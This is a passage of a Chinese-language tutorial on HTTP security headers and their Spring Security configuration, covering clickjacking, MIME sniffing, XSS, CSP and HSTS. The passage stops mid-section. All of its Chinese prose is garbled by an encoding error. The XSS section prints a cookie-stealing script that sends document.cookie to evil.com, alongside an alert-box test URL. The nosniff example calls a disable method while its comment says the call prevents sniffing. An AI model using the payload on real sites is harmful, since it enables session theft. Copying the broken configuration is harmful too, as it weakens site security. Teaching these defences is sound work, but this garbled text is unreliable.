---
title: 3ã€HTTPå®‰å…¨å¤´éƒ¨
---
## ğŸ“š ç›®å½•

1. [HTTPå®‰å…¨å¤´éƒ¨æ¦‚è¿°](#1-HTTPå®‰å…¨å¤´éƒ¨æ¦‚è¿°)
2. [X-Frame-Options - é˜²æ­¢ç‚¹å‡»åŠ«æŒ](#2-X-Frame-Options-é˜²æ­¢ç‚¹å‡»åŠ«æŒ)
3. [X-Content-Type-Options - é˜²æ­¢MIMEå—…æ¢](#3-X-Content-Type-Options-é˜²æ­¢MIMEå—…æ¢)
4. [X-XSS-Protection - XSSé˜²æŠ¤](#4-X-XSS-Protection-XSSé˜²æŠ¤)
5. [Content-Security-Policy - å†…å®¹å®‰å…¨ç­–ç•¥](#5-Content-Security-Policy-å†…å®¹å®‰å…¨ç­–ç•¥)
6. [Strict-Transport-Security - HSTSå¼ºåˆ¶HTTPS](#6-Strict-Transport-Security-HSTSå¼ºåˆ¶HTTPS)
7. [Referrer-Policy - å¼•ç”¨ç­–ç•¥](#7-Referrer-Policy-å¼•ç”¨ç­–ç•¥)
8. [Feature-Policy - åŠŸèƒ½ç­–ç•¥](#8-Feature-Policy-åŠŸèƒ½ç­–ç•¥)
9. [Spring Securityé…ç½®å®æˆ˜](#9-Spring-Securityé…ç½®å®æˆ˜)
10. [æ ¸å¿ƒè¦ç‚¹æ€»ç»“](#10-æ ¸å¿ƒè¦ç‚¹æ€»ç»“)

---

## 1. ğŸ›¡ï¸ HTTPå®‰å…¨å¤´éƒ¨æ¦‚è¿°


### 1.1 ä»€ä¹ˆæ˜¯HTTPå®‰å…¨å¤´éƒ¨


**é€šä¿—ç†è§£**ï¼šå°±åƒç»™ä½ çš„ç½‘ç«™åŠ ä¸Šä¸€å±‚"é˜²æŠ¤ç½©"

```
æƒ³è±¡ä½ å¼€äº†ä¸€å®¶å•†åº—ï¼š
ğŸª æ™®é€šå•†åº—ï¼šé—¨å¼€ç€ï¼Œè°éƒ½èƒ½è¿›
ğŸ”’ åŠ äº†å®‰å…¨å¤´çš„å•†åº—ï¼š
   - è£…äº†é˜²ç›—é—¨ï¼ˆX-Frame-Optionsï¼‰
   - è£…äº†ç›‘æ§ï¼ˆCSPï¼‰
   - è´´äº†å®‰å…¨æç¤ºï¼ˆHSTSï¼‰
   
HTTPå®‰å…¨å¤´ = å‘Šè¯‰æµè§ˆå™¨"è¯·æŒ‰ç…§è¿™äº›å®‰å…¨è§„åˆ™ä¿æŠ¤æˆ‘çš„ç½‘ç«™"
```

**ğŸ“‹ æ ¸å¿ƒä½œç”¨**
- **é˜²æ­¢æ”»å‡»**ï¼šé˜»æ­¢å¸¸è§çš„Webæ”»å‡»ï¼ˆXSSã€ç‚¹å‡»åŠ«æŒç­‰ï¼‰
- **å¢å¼ºå®‰å…¨**ï¼šè®©æµè§ˆå™¨æŒ‰ç…§ä½ çš„è§„åˆ™æ‰§è¡Œå®‰å…¨ç­–ç•¥
- **é…ç½®ç®€å•**ï¼šåªéœ€è¦åœ¨HTTPå“åº”ä¸­æ·»åŠ å‡ ä¸ªå¤´éƒ¨å­—æ®µ
- **æ— éœ€æ”¹ä»£ç **ï¼šä¸ç”¨ä¿®æ”¹ä¸šåŠ¡ä»£ç ï¼Œé…ç½®å³å¯ç”Ÿæ•ˆ

### 1.2 ä¸ºä»€ä¹ˆéœ€è¦å®‰å…¨å¤´éƒ¨


**ğŸ”¸ ç°å®ä¸­çš„å®‰å…¨éšæ‚£**

```
æ²¡æœ‰å®‰å…¨å¤´éƒ¨çš„ç½‘ç«™å°±åƒï¼š

ğŸš¨ åœºæ™¯1ï¼šä½ çš„ç½‘ç«™è¢«åµŒå…¥åˆ°æ¶æ„ç½‘ç«™
   ç”¨æˆ·ä»¥ä¸ºåœ¨è®¿é—®é“¶è¡Œç½‘ç«™
   å®é™…ä¸Šæ˜¯é»‘å®¢çš„é’“é±¼é¡µé¢
   â†’ X-Frame-Optionså¯ä»¥é˜²æ­¢

ğŸš¨ åœºæ™¯2ï¼šé»‘å®¢æ³¨å…¥æ¶æ„è„šæœ¬
   çªƒå–ç”¨æˆ·çš„ç™»å½•ä¿¡æ¯
   â†’ CSPå’ŒXSS-Protectionå¯ä»¥é˜²æ­¢

ğŸš¨ åœºæ™¯3ï¼šç”¨æˆ·ç”¨HTTPè®¿é—®ç½‘ç«™
   å¯†ç åœ¨ç½‘ç»œä¸­æ˜æ–‡ä¼ è¾“
   â†’ HSTSå¼ºåˆ¶ä½¿ç”¨HTTPS
```

### 1.3 å®‰å…¨å¤´éƒ¨å…¨æ™¯å›¾


```
HTTPå®‰å…¨å¤´éƒ¨ä½“ç³»ï¼š

â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚         æµè§ˆå™¨å®‰å…¨é˜²æŠ¤æœºåˆ¶           â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚                                     â”‚
â”‚  ğŸ¯ é˜²æ­¢åµŒå…¥æ”»å‡»                     â”‚
â”‚  â””â”€ X-Frame-Options                â”‚
â”‚                                     â”‚
â”‚  ğŸ¯ é˜²æ­¢MIMEç±»å‹æ··æ·†                 â”‚
â”‚  â””â”€ X-Content-Type-Options         â”‚
â”‚                                     â”‚
â”‚  ğŸ¯ é˜²æ­¢XSSè·¨ç«™è„šæœ¬                  â”‚
â”‚  â”œâ”€ X-XSS-Protection              â”‚
â”‚  â””â”€ Content-Security-Policy       â”‚
â”‚                                     â”‚
â”‚  ğŸ¯ å¼ºåˆ¶HTTPSä¼ è¾“                    â”‚
â”‚  â””â”€ Strict-Transport-Security      â”‚
â”‚                                     â”‚
â”‚  ğŸ¯ æ§åˆ¶å¼•ç”¨ä¿¡æ¯                     â”‚
â”‚  â””â”€ Referrer-Policy               â”‚
â”‚                                     â”‚
â”‚  ğŸ¯ é™åˆ¶æµè§ˆå™¨åŠŸèƒ½                   â”‚
â”‚  â””â”€ Feature-Policy                â”‚
â”‚                                     â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

---

## 2. ğŸ–¼ï¸ X-Frame-Options - é˜²æ­¢ç‚¹å‡»åŠ«æŒ


### 2.1 ä»€ä¹ˆæ˜¯ç‚¹å‡»åŠ«æŒ


**é€šä¿—è§£é‡Š**ï¼šé»‘å®¢æŠŠä½ çš„ç½‘ç«™"è£…"åˆ°ä»–çš„ç½‘ç«™é‡Œï¼Œéª—ç”¨æˆ·ç‚¹å‡»

```
æ”»å‡»åœºæ™¯æ¼”ç¤ºï¼š

æ­£å¸¸æƒ…å†µï¼š
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚  ä½ çš„é“¶è¡Œç½‘ç«™   â”‚
â”‚  [è½¬è´¦æŒ‰é’®]     â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜

ç‚¹å‡»åŠ«æŒæ”»å‡»ï¼š
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚   é»‘å®¢çš„æ¶æ„ç½‘ç«™         â”‚
â”‚   â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”‚
â”‚   â”‚ é€æ˜çš„iframe     â”‚  â”‚  â† ä½ çš„ç½‘ç«™è¢«åµŒå…¥
â”‚   â”‚ [è½¬è´¦æŒ‰é’®]        â”‚  â”‚
â”‚   â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â”‚
â”‚   [ç‚¹å‡»é¢†å–çº¢åŒ…]         â”‚  â† ç”¨æˆ·ä»¥ä¸ºç‚¹è¿™é‡Œ
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜

ç»“æœï¼šç”¨æˆ·ä»¥ä¸ºç‚¹"é¢†çº¢åŒ…"ï¼Œå®é™…ç‚¹äº†"è½¬è´¦"
```

### 2.2 X-Frame-Optionsé…ç½®


**ğŸ“‹ ä¸‰ç§é…ç½®å€¼**

| é…ç½®å€¼ | å«ä¹‰ | ä½¿ç”¨åœºæ™¯ |
|--------|------|----------|
| `DENY` | **å®Œå…¨ç¦æ­¢**è¢«ä»»ä½•ç½‘ç«™åµŒå…¥ | ğŸ”’ ä¸éœ€è¦è¢«åµŒå…¥çš„ç½‘ç«™ï¼ˆå¤§éƒ¨åˆ†æƒ…å†µï¼‰ |
| `SAMEORIGIN` | **åªå…è®¸**åŒæºç½‘ç«™åµŒå…¥ | ğŸ¢ è‡ªå·±ç½‘ç«™å†…éƒ¨é¡µé¢äº’ç›¸åµŒå…¥ |
| `ALLOW-FROM uri` | **æŒ‡å®š**æŸä¸ªç½‘ç«™å¯ä»¥åµŒå…¥ | ğŸ¤ ä¸ç‰¹å®šåˆä½œä¼™ä¼´é›†æˆï¼ˆå·²åºŸå¼ƒï¼‰ |

**ğŸ’¡ é…ç½®ç¤ºä¾‹**

```java
// Spring Securityé…ç½®
@Configuration
public class SecurityConfig {
    
    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) {
        http.headers(headers -> headers
            // æ–¹å¼1ï¼šå®Œå…¨ç¦æ­¢è¢«åµŒå…¥ï¼ˆæœ€å®‰å…¨ï¼‰
            .frameOptions(frame -> frame.deny())
            
            // æ–¹å¼2ï¼šåªå…è®¸åŒæºåµŒå…¥
            // .frameOptions(frame -> frame.sameOrigin())
        );
        return http.build();
    }
}
```

**ğŸ” å®é™…æ•ˆæœ**

```
é…ç½®ç”Ÿæ•ˆåçš„HTTPå“åº”å¤´ï¼š
X-Frame-Options: DENY

æµè§ˆå™¨è¡Œä¸ºï¼š
- å¦‚æœæœ‰ç½‘ç«™è¯•å›¾ç”¨<iframe>åµŒå…¥ä½ çš„é¡µé¢
- æµè§ˆå™¨ä¼šæ‹’ç»æ˜¾ç¤º
- æ§åˆ¶å°æ˜¾ç¤ºé”™è¯¯ï¼š
  "Refused to display in a frame because it set 'X-Frame-Options' to 'deny'"
```

### 2.3 ä½¿ç”¨å»ºè®®


**âœ… æ¨èåšæ³•**
- å¤§éƒ¨åˆ†ç½‘ç«™ä½¿ç”¨ `DENY`
- å†…éƒ¨ç®¡ç†ç³»ç»Ÿå¯ç”¨ `SAMEORIGIN`
- é¿å…ä½¿ç”¨ `ALLOW-FROM`ï¼ˆæµè§ˆå™¨æ”¯æŒå·®ï¼‰

**âš ï¸ æ³¨æ„äº‹é¡¹**
- å¦‚æœä½ çš„ç½‘ç«™**ç¡®å®éœ€è¦**è¢«ç¬¬ä¸‰æ–¹åµŒå…¥ï¼ˆå¦‚ç¬¬ä¸‰æ–¹æ”¯ä»˜é¡µé¢ï¼‰ï¼Œä¸è¦é…ç½®æ­¤å¤´éƒ¨
- ç°ä»£åšæ³•æ˜¯ç”¨ CSP çš„ `frame-ancestors` æŒ‡ä»¤æ›¿ä»£

---

## 3. ğŸ“„ X-Content-Type-Options - é˜²æ­¢MIMEå—…æ¢


### 3.1 ä»€ä¹ˆæ˜¯MIMEå—…æ¢æ”»å‡»


**é€šä¿—ç†è§£**ï¼šæµè§ˆå™¨"çŒœé”™"äº†æ–‡ä»¶ç±»å‹ï¼Œå¯¼è‡´å®‰å…¨é—®é¢˜

```
æ­£å¸¸æƒ…å†µï¼š
æœåŠ¡å™¨è¯´ï¼šè¿™æ˜¯ä¸ªå›¾ç‰‡ï¼ˆContent-Type: image/pngï¼‰
æµè§ˆå™¨ï¼šå¥½çš„ï¼Œæˆ‘å°±å½“å›¾ç‰‡æ˜¾ç¤º

MIMEå—…æ¢æ”»å‡»ï¼š
æœåŠ¡å™¨è¯´ï¼šè¿™æ˜¯ä¸ªå›¾ç‰‡ï¼ˆContent-Type: image/pngï¼‰
ä½†æ–‡ä»¶å®é™…åŒ…å«ï¼šJavaScriptæ¶æ„ä»£ç 
è€ç‰ˆæœ¬æµè§ˆå™¨ï¼šå’¦ï¼Œè¿™ä¸åƒå›¾ç‰‡ï¼Œåƒè„šæœ¬ï¼Œæˆ‘å¸®ä½ æ‰§è¡Œå§
â†’ æ¶æ„ä»£ç è¢«æ‰§è¡Œï¼
```

**ğŸš¨ æ”»å‡»åœºæ™¯**

```
æ”»å‡»æ­¥éª¤ï¼š
1. é»‘å®¢ä¸Šä¼ ä¸€ä¸ª"å›¾ç‰‡"æ–‡ä»¶
   æ–‡ä»¶åï¼šavatar.png
   å®é™…å†…å®¹ï¼š<script>æ¶æ„ä»£ç </script>

2. æœåŠ¡å™¨è¿”å›ï¼š
   Content-Type: image/png
   
3. æ²¡æœ‰å®‰å…¨å¤´çš„æƒ…å†µï¼š
   æµè§ˆå™¨çŒœæµ‹ï¼šè¿™ä¸æ˜¯å›¾ç‰‡ï¼Œæ˜¯HTMLï¼
   â†’ æ‰§è¡Œäº†æ¶æ„è„šæœ¬

4. æœ‰å®‰å…¨å¤´çš„æƒ…å†µï¼š
   X-Content-Type-Options: nosniff
   æµè§ˆå™¨ï¼šContent-Typeè¯´æ˜¯å›¾ç‰‡ï¼Œæˆ‘å°±å½“å›¾ç‰‡
   â†’ ä¸ä¼šæ‰§è¡Œè„šæœ¬
```

### 3.2 é…ç½®æ–¹æ³•


**ğŸ“‹ å”¯ä¸€é…ç½®å€¼**ï¼š`nosniff`ï¼ˆä¸å—…æ¢ï¼‰

```java
@Configuration
public class SecurityConfig {
    
    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) {
        http.headers(headers -> headers
            // é˜²æ­¢MIMEç±»å‹å—…æ¢
            .contentTypeOptions(options -> options.disable())  // é»˜è®¤å°±æ˜¯å¯ç”¨çš„
        );
        return http.build();
    }
}
```

**ğŸ” å®é™…æ•ˆæœ**

```
HTTPå“åº”å¤´ï¼š
X-Content-Type-Options: nosniff

æµè§ˆå™¨è¡Œä¸ºï¼š
- ä¸¥æ ¼æŒ‰ç…§Content-Typeæ‰§è¡Œ
- å¦‚æœContent-Typeæ˜¯image/pngï¼Œå°±åªå½“å›¾ç‰‡
- ä¸ä¼š"èªæ˜"åœ°çŒœæµ‹æ–‡ä»¶ç±»å‹
```

### 3.3 æœ€ä½³å®è·µ


**âœ… å¿…é¡»é…ç½®**
- æ‰€æœ‰ç½‘ç«™éƒ½åº”è¯¥å¯ç”¨æ­¤å¤´éƒ¨
- Spring Securityé»˜è®¤å·²å¯ç”¨
- å¦‚æœæ‰‹åŠ¨ç¦ç”¨äº†ï¼Œè®°å¾—é‡æ–°å¯ç”¨

**ğŸ¯ é…åˆä½¿ç”¨**
```java
// åŒæ—¶ç¡®ä¿Content-Typeè®¾ç½®æ­£ç¡®
@GetMapping("/api/image")
public ResponseEntity<byte[]> getImage() {
    byte[] imageBytes = ...;
    
    HttpHeaders headers = new HttpHeaders();
    headers.setContentType(MediaType.IMAGE_PNG);  // æ˜ç¡®æŒ‡å®šç±»å‹
    
    return new ResponseEntity<>(imageBytes, headers, HttpStatus.OK);
}
```

---

## 4. ğŸ›¡ï¸ X-XSS-Protection - XSSé˜²æŠ¤


### 4.1 ä»€ä¹ˆæ˜¯XSSæ”»å‡»


**é€šä¿—è§£é‡Š**ï¼šé»‘å®¢åœ¨ä½ çš„ç½‘é¡µé‡Œæ³¨å…¥æ¶æ„è„šæœ¬ï¼Œçªƒå–ç”¨æˆ·ä¿¡æ¯

```
XSSæ”»å‡»ç¤ºä¾‹ï¼š

åœºæ™¯ï¼šè¯„è®ºåŠŸèƒ½
æ­£å¸¸è¯„è®ºï¼š
  ç”¨æˆ·è¾“å…¥ï¼š"è¿™ä¸ªäº§å“ä¸é”™ï¼"
  é¡µé¢æ˜¾ç¤ºï¼š"è¿™ä¸ªäº§å“ä¸é”™ï¼"

XSSæ”»å‡»ï¼š
  é»‘å®¢è¾“å…¥ï¼š<script>window.location='http://evil.com?cookie='+document.cookie</script>
  
  æ²¡æœ‰é˜²æŠ¤æ—¶ï¼š
  â†’ è„šæœ¬è¢«æ‰§è¡Œ
  â†’ å…¶ä»–ç”¨æˆ·çš„Cookieè¢«å‘é€åˆ°é»‘å®¢æœåŠ¡å™¨
  â†’ é»‘å®¢è·å–ç”¨æˆ·ç™»å½•ä¿¡æ¯

  æœ‰XSS-Protectionæ—¶ï¼š
  â†’ æµè§ˆå™¨æ£€æµ‹åˆ°å¯ç–‘è„šæœ¬
  â†’ é˜»æ­¢é¡µé¢åŠ è½½æˆ–åˆ é™¤è„šæœ¬
```

### 4.2 é…ç½®é€‰é¡¹


**ğŸ“‹ é…ç½®å€¼è¯´æ˜**

| é…ç½® | å«ä¹‰ | è¯´æ˜ |
|------|------|------|
| `0` | **å…³é—­**XSSè¿‡æ»¤ | ä¸æ¨è |
| `1` | **å¯ç”¨**XSSè¿‡æ»¤ | æ£€æµ‹åˆ°æ”»å‡»æ—¶æ¸…ç†é¡µé¢ |
| `1; mode=block` | **å¯ç”¨å¹¶é˜»æ­¢** | æ£€æµ‹åˆ°æ”»å‡»ç›´æ¥é˜»æ­¢é¡µé¢åŠ è½½ |

**ğŸ’¡ é…ç½®ç¤ºä¾‹**

```java
@Configuration
public class SecurityConfig {
    
    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) {
        http.headers(headers -> headers
            // XSSä¿æŠ¤ï¼ˆæ³¨æ„ï¼šç°ä»£æµè§ˆå™¨å·²å¼ƒç”¨æ­¤å¤´éƒ¨ï¼‰
            .xssProtection(xss -> xss
                .enable()                    // å¯ç”¨XSSè¿‡æ»¤
                .block(true)                 // mode=blockï¼Œé˜»æ­¢è€Œéæ¸…ç†
            )
        );
        return http.build();
    }
}
```

**ğŸ” å®é™…æ•ˆæœ**

```
HTTPå“åº”å¤´ï¼š
X-XSS-Protection: 1; mode=block

æµè§ˆå™¨è¡Œä¸ºï¼š
ç”¨æˆ·è®¿é—®ï¼šhttp://yoursite.com/search?q=<script>alert('xss')</script>
â†’ æµè§ˆå™¨æ£€æµ‹åˆ°URLä¸­çš„è„šæœ¬
â†’ ç›´æ¥é˜»æ­¢é¡µé¢æ¸²æŸ“
â†’ æ˜¾ç¤ºé”™è¯¯é¡µé¢
```

### 4.3 é‡è¦æç¤º


**âš ï¸ è¯¥å¤´éƒ¨å·²è¿‡æ—¶**

```
æµè§ˆå™¨æ”¯æŒæƒ…å†µï¼š
âœ… Chromeï¼šå·²ç§»é™¤æ”¯æŒï¼ˆ2020å¹´ï¼‰
âœ… Firefoxï¼šä»æœªæ”¯æŒ
âœ… Safariï¼šä»æ”¯æŒ
âœ… Edgeï¼šå·²ç§»é™¤æ”¯æŒ

ç°ä»£åšæ³•ï¼š
â†’ ä½¿ç”¨ Content-Security-Policyï¼ˆCSPï¼‰æ›¿ä»£
â†’ åç«¯åšå¥½è¾“å…¥éªŒè¯å’Œè¾“å‡ºç¼–ç 
```

**ğŸ¯ æ¨èæ–¹æ¡ˆ**
```java
// ä¸ä¾èµ–æµè§ˆå™¨çš„XSSè¿‡æ»¤
// è€Œæ˜¯åœ¨åç«¯åšé˜²æŠ¤

// 1. è¾“å…¥éªŒè¯
@PostMapping("/comment")
public void addComment(@RequestBody @Valid CommentDTO comment) {
    // éªŒè¯è¾“å…¥å†…å®¹
}

// 2. è¾“å‡ºç¼–ç ï¼ˆThymeleafè‡ªåŠ¨è½¬ä¹‰ï¼‰
<div th:text="${comment.content}"></div>  
<!-- è‡ªåŠ¨å°† <script> è½¬ä¹‰ä¸º &lt;script&gt; -->

// 3. ä½¿ç”¨CSPï¼ˆä¸‹ä¸€èŠ‚è¯¦è§£ï¼‰
```

---

## 5. ğŸ” Content-Security-Policy - å†…å®¹å®‰å…¨ç­–ç•¥


### 5.1 CSPæ˜¯ä»€ä¹ˆ


**é€šä¿—ç†è§£**ï¼šç»™æµè§ˆå™¨ä¸€ä»½"ç™½åå•"ï¼Œå‘Šè¯‰å®ƒå“ªäº›èµ„æºå¯ä»¥åŠ è½½

```
æƒ³è±¡ä½ åœ¨ç®¡ç†ä¸€ä¸ªå°åŒºï¼š

æ²¡æœ‰CSPï¼š
- ä»»ä½•äººï¼ˆèµ„æºï¼‰éƒ½èƒ½è¿›æ¥
- ä¸çŸ¥é“è°æ˜¯å¥½äººè°æ˜¯åäºº
- å®¹æ˜“å‡ºå®‰å…¨é—®é¢˜

æœ‰äº†CSPï¼š
- é—¨å«ï¼ˆæµè§ˆå™¨ï¼‰æœ‰ä¸€ä»½ç™½åå•
- åªæœ‰åå•ä¸Šçš„äººï¼ˆèµ„æºï¼‰æ‰èƒ½è¿›
- å…¶ä»–äººä¸€å¾‹æ‹’ç»
```

**ğŸ¯ æ ¸å¿ƒåŠŸèƒ½**
- **é˜²æ­¢XSS**ï¼šé™åˆ¶è„šæœ¬æ¥æºï¼Œé˜»æ­¢æ¶æ„è„šæœ¬æ‰§è¡Œ
- **é˜²æ­¢æ³¨å…¥**ï¼šæ§åˆ¶æ ·å¼ã€å›¾ç‰‡ã€å­—ä½“ç­‰èµ„æºåŠ è½½
- **é˜²æ­¢æ•°æ®æ³„éœ²**ï¼šé™åˆ¶ç½‘é¡µå¯ä»¥è¿æ¥çš„æœåŠ¡å™¨
- **æä¾›æŠ¥å‘Š**ï¼šè¿è§„è¡Œä¸ºå¯ä»¥ä¸ŠæŠ¥æœåŠ¡å™¨

### 5.2 CSPæŒ‡ä»¤è¯¦è§£


**ğŸ“‹ å¸¸ç”¨æŒ‡ä»¤ä¸€è§ˆ**

| æŒ‡ä»¤ | ä½œç”¨ | ç¤ºä¾‹ |
|------|------|------|
| `default-src` | **é»˜è®¤**èµ„æºåŠ è½½ç­–ç•¥ | `default-src 'self'` åªå…è®¸åŒæº |
| `script-src` | **JavaScript**è„šæœ¬æ¥æº | `script-src 'self' cdn.com` |
| `style-src` | **CSSæ ·å¼**æ¥æº | `style-src 'self' 'unsafe-inline'` |
| `img-src` | **å›¾ç‰‡**æ¥æº | `img-src 'self' data: https:` |
| `connect-src` | **Ajax/WebSocket**è¿æ¥ | `connect-src 'self' api.example.com` |
| `font-src` | **å­—ä½“**æ¥æº | `font-src 'self' fonts.gstatic.com` |
| `frame-src` | **iframe**æ¥æº | `frame-src 'none'` ç¦æ­¢iframe |
| `frame-ancestors` | è°å¯ä»¥**åµŒå…¥**æœ¬é¡µé¢ | `frame-ancestors 'self'` æ›¿ä»£X-Frame-Options |

**ğŸ”¸ ç‰¹æ®Šå…³é”®å­—**

```
'self'           â†’ åªå…è®¸åŒæºèµ„æº
'none'           â†’ ç¦æ­¢æ‰€æœ‰æ¥æº
'unsafe-inline'  â†’ å…è®¸å†…è”è„šæœ¬/æ ·å¼ï¼ˆä¸å®‰å…¨ï¼Œå°½é‡é¿å…ï¼‰
'unsafe-eval'    â†’ å…è®¸eval()ï¼ˆä¸å®‰å…¨ï¼Œå°½é‡é¿å…ï¼‰
https:           â†’ åªå…è®¸HTTPSèµ„æº
data:            â†’ å…è®¸data: URLï¼ˆå¦‚base64å›¾ç‰‡ï¼‰
```

### 5.3 å®æˆ˜é…ç½®ç¤ºä¾‹


**ğŸ’¡ åŸºç¡€é…ç½®ï¼šä¸¥æ ¼å®‰å…¨**

```java
@Configuration
public class SecurityConfig {
    
    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) {
        http.headers(headers -> headers
            .contentSecurityPolicy(csp -> csp
                .policyDirectives(
                    "default-src 'self'; " +           // é»˜è®¤åªå…è®¸åŒæº
                    "script-src 'self'; " +            // è„šæœ¬åªèƒ½æ¥è‡ªæœ¬ç«™
                    "style-src 'self'; " +             // æ ·å¼åªèƒ½æ¥è‡ªæœ¬ç«™
                    "img-src 'self' data: https:; " +  // å›¾ç‰‡ï¼šæœ¬ç«™+data URL+HTTPS
                    "font-src 'self'; " +              // å­—ä½“åªèƒ½æ¥è‡ªæœ¬ç«™
                    "connect-src 'self'; " +           // APIåªèƒ½è°ƒç”¨æœ¬ç«™
                    "frame-ancestors 'none'; " +       // ç¦æ­¢è¢«åµŒå…¥iframe
                    "base-uri 'self'; " +              // é™åˆ¶<base>æ ‡ç­¾
                    "form-action 'self'"               // è¡¨å•åªèƒ½æäº¤åˆ°æœ¬ç«™
                )
            )
        );
        return http.build();
    }
}
```

**ğŸ’¡ å®ç”¨é…ç½®ï¼šå…¼é¡¾å®‰å…¨ä¸åŠŸèƒ½**

```java
@Bean
public SecurityFilterChain filterChain(HttpSecurity http) {
    http.headers(headers -> headers
        .contentSecurityPolicy(csp -> csp
            .policyDirectives(
                "default-src 'self'; " +
                
                // å…è®¸CDNçš„è„šæœ¬å’Œæ ·å¼
                "script-src 'self' https://cdn.jsdelivr.net; " +
                "style-src 'self' https://cdn.jsdelivr.net 'unsafe-inline'; " +
                
                // å…è®¸å¤šä¸ªå›¾ç‰‡æ¥æº
                "img-src 'self' data: https: blob:; " +
                
                // å…è®¸Googleå­—ä½“
                "font-src 'self' https://fonts.gstatic.com; " +
                
                // APIå¯ä»¥è°ƒç”¨åç«¯æœåŠ¡
                "connect-src 'self' https://api.example.com; " +
                
                // å…è®¸åŒæºåµŒå…¥
                "frame-ancestors 'self'; " +
                
                // è¿è§„æŠ¥å‘Šåœ°å€
                "report-uri /api/csp-report"
            )
        )
    );
    return http.build();
}
```

### 5.4 CSPè¿è§„æŠ¥å‘Š


**ğŸ“Š æ¥æ”¶è¿è§„æŠ¥å‘Š**

```java
// 1. CSPé…ç½®ä¸­æ·»åŠ report-uri
"report-uri /api/csp-report"

// 2. åˆ›å»ºæ¥æ”¶ç«¯ç‚¹
@RestController
public class CspReportController {
    
    @PostMapping("/api/csp-report")
    public void handleCspReport(@RequestBody String report) {
        // æŠ¥å‘Šæ ¼å¼ç¤ºä¾‹ï¼š
        // {
        //   "csp-report": {
        //     "document-uri": "https://example.com/page",
        //     "violated-directive": "script-src 'self'",
        //     "blocked-uri": "https://evil.com/bad.js",
        //     "line-number": 15
        //   }
        // }
        
        log.warn("CSPè¿è§„ï¼š{}", report);
        // å¯ä»¥ä¿å­˜åˆ°æ•°æ®åº“åˆ†æ
    }
}
```

### 5.5 æ¸è¿›å¼éƒ¨ç½²ç­–ç•¥


**ğŸ¯ é¿å…ä¸€æ¬¡æ€§ç ´åç½‘ç«™**

```java
// é˜¶æ®µ1ï¼šä»…æŠ¥å‘Šæ¨¡å¼ï¼ˆä¸é˜»æ­¢ï¼ŒåªæŠ¥å‘Šï¼‰
http.headers(headers -> headers
    .contentSecurityPolicy(csp -> csp
        .reportOnly()  // åªæŠ¥å‘Šï¼Œä¸å®é™…é˜»æ­¢
        .policyDirectives("default-src 'self'; report-uri /api/csp-report")
    )
);
// HTTPå“åº”å¤´ï¼šContent-Security-Policy-Report-Only: ...

// è§‚å¯Ÿ1-2å‘¨ï¼ŒæŸ¥çœ‹è¿è§„æŠ¥å‘Š

// é˜¶æ®µ2ï¼šä¿®å¤è¿è§„é—®é¢˜åï¼Œå¯ç”¨å®é™…é˜»æ­¢
http.headers(headers -> headers
    .contentSecurityPolicy(csp -> csp
        .policyDirectives("default-src 'self'; report-uri /api/csp-report")
    )
);
// HTTPå“åº”å¤´ï¼šContent-Security-Policy: ...
```

---

## 6. ğŸ”’ Strict-Transport-Security - HSTSå¼ºåˆ¶HTTPS


### 6.1 HSTSæ˜¯ä»€ä¹ˆ


**é€šä¿—ç†è§£**ï¼šå‘Šè¯‰æµè§ˆå™¨"ä»¥åè®¿é—®æˆ‘ï¼Œå¿…é¡»ç”¨HTTPS"

```
æ²¡æœ‰HSTSçš„æƒ…å†µï¼š

ç”¨æˆ·è¾“å…¥ï¼šexample.com
æµè§ˆå™¨ï¼šå…ˆè¯•è¯• http://example.com
â†“
HTTPæ˜æ–‡ä¼ è¾“ï¼ˆå¯èƒ½è¢«åŠ«æŒï¼‰
â†“
æœåŠ¡å™¨302é‡å®šå‘åˆ° https://example.com
â†“
æœ€ç»ˆç”¨HTTPS

é—®é¢˜ï¼šç¬¬ä¸€æ¬¡è®¿é—®ä»ç„¶æ˜¯HTTPï¼Œå­˜åœ¨å®‰å…¨éšæ‚£ï¼
```

```
æœ‰HSTSçš„æƒ…å†µï¼š

ç”¨æˆ·è¾“å…¥ï¼šexample.com
æµè§ˆå™¨ï¼šä¸Šæ¬¡è®¿é—®æ—¶æœåŠ¡å™¨è¯´å¿…é¡»ç”¨HTTPS
â†“
æµè§ˆå™¨è‡ªåŠ¨å°†è¯·æ±‚æ”¹ä¸º https://example.com
â†“
ç›´æ¥HTTPSè¿æ¥ï¼ˆå®‰å…¨ï¼ï¼‰

ä¼˜åŠ¿ï¼š
- ä¸ä¼šå…ˆå‘HTTPè¯·æ±‚
- é¿å…ä¸­é—´äººæ”»å‡»
- æ€§èƒ½æ›´å¥½ï¼ˆçœå»é‡å®šå‘ï¼‰
```

### 6.2 HSTSé…ç½®


**ğŸ“‹ é…ç½®å‚æ•°**

```
Strict-Transport-Security: max-age=<ç§’æ•°>; includeSubDomains; preload

å‚æ•°è¯´æ˜ï¼š
